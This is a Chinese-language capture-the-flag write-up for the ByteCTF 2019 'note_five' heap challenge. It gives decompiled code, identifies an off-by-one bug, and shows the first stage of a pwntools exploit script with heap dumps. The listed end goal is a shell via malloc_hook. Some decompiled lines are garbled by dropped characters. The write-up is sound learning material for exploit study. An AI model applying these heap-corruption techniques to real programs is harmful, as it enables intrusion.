* * *
# 简介
大佬都是秒题，但作为一个萌新做该题还是觉得很吃力，涉及很多并且不熟悉的知识点，学习记录一下过程，对自己和其他人都是有帮助的。
知识点包括，可以分别对照学习：
  1. Off By One
  2. Chunk Extend and Overlapping
  3. Unsorted Bins Attack
  4. Fast Bin Attack and Arbitrary Alloc 
  5. Overwrite Stdout Leak Libc
  6. Overwrite malloc_hook and realloc
  7. One gadget getshell
# 信息
Checksec
    pwndbg> checksec
    [*] '/root/pwn/bytectf2019/note-five/note_five'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
IDA F5
main函数
    __int64 __fastcall main(__int64 a1, char **a2, char **a3)
    {
      unsigned int v3; // ST0C_4
      __int64 result; // rax
      setbuff();
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            while ( 1 )
            {
              v3 = menu();
              result = v3;
              if ( v3 != 2 )
                break;
              edit_info();
            }
            if ( (signed int)result > 2 )
              break;
            if ( (_DWORD)result != 1 )
              goto bad_note;
            create_info();
          }
          if ( (_DWORD)result != 3 )
            break;
          delete_info();
        }
        if ( (_DWORD)result == 4 )
          return result;
    bad_note:
        puts("bad choice");
      }
    }
`menu`函数
    int menu()
    {
      puts("infomation management:");
      puts("1. new info");
      puts("2. edit info");
      puts("3. delete info");
      puts("4. exit");
      printf("choice>> ");
      return input_num();
    }
包含创建、编辑、删除info的功能。
`create_info`函数
    int create_info()
    {
      _DWORD *v0; // rax
      int info_id; // [rsp+8h] [rbp-8h]
      int size; // [rsp+Ch] [rbp-4h]
      printf("idx: ");
      info_id = input_num();
      if ( info_id >= 0 && info_id  143 && size  4 || !info_array[id] )
        return puts("idx error");
      printf("content: ");
      return readinput(info_array[id], info_len_array[id], '\n');
    }
根据索引`id`在数组中确定对象的空间地址和大小，并传入`readinput`写入内容。
`delete_info`函数
    int delete_info()
    {
      _DWORD *v0; // rax
      int v2; // [rsp+Ch] [rbp-4h]
      printf("idx: ");
      v2 = input_num();
      if ( v2 >= 0 && v2  length )
          break;
        if ( (signed int)read(0, &buf, 1uLL)  length`，可以溢出多写一字节，存在`off by one`漏洞。
# 解决
基本操作
    #coding=utf-8
    from pwn import *
    import struct
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    p = process("./note_five")
    pwnlib.gdb.attach(p)
    def create(idx,size):
        p.sendlineafter("choice>>",str(1))
        p.sendlineafter("idx:",str(idx))
        p.sendlineafter("size:",str(size))
    def edit(idx,content):
        p.sendlineafter("choice>>",str(2))
        p.sendlineafter("idx:",str(idx))
        p.sendlineafter("content:",content)
    def delete(idx):
        p.sendlineafter("choice>>", str(3))
        p.sendlineafter("idx:", str(idx))
创建四个成员，大小如下：
    #创建四个chunk
    create(0,0x98)
    create(1,0x98)
    create(2,0x98) 
    create(3,0x98) #隔离chunk，防止和top chunk合并
堆块如下：
    pwndbg> heapls
               ADDR             SIZE            STATUS
    sbrk_base  0x555555758000
    chunk      0x555555758000   0xa0            (inuse)
    chunk      0x5555557580a0   0xa0            (inuse)
    chunk      0x555555758140   0xa0            (inuse)
    chunk      0x5555557581e0   0xa0            (inuse)
    chunk      0x555555758280   0x20d80         (top)
## Off By One
    delete(0)
    edit(1,"A"*0x90 + p64(0x140) + p8(0xa0))
    raw_input("1")
    # off bu one overwrite next chunk(chunk2) szie and prev_size
    delete(2)
删除0号，挂入`unsorted bins`，在1号处进行`Off By
One`，覆盖2号的`prev_chunk_size`为两个成员`chunk`大小`0x140(0xa0+0xa0)`，`prev_chunk_inuse`标志位置零。
    pwndbg> heapls
               ADDR             SIZE            STATUS
    sbrk_base  0x555555758000
    chunk      0x555555758000   0xa0            (F) FD 0x7ffff7dd5b78 BK 0x7ffff7dd5b78 (LC)
    chunk      0x5555557580a0   0xa0            (F) FD 0x4141414141414141 BK 0x4141414141414141 (LC)
    chunk      0x555555758140   0xa0            (inuse)
    chunk      0x5555557581e0   0xa0            (inuse)
    chunk      0x555555758280   0x20d80         (top)
    sbrk_end   0x555555779000
    pwndbg> x /10gx 0x555555758140
    0x555555758140: 0x0000000000000140      0x00000000000000a0
    0x555555758150: 0x0000000000000000      0x0000000000000000
    0x555555758160: 0x0000000000000000      0x0000000000000000
    0x555555758170: 0x0000000000000000      0x0000000000000000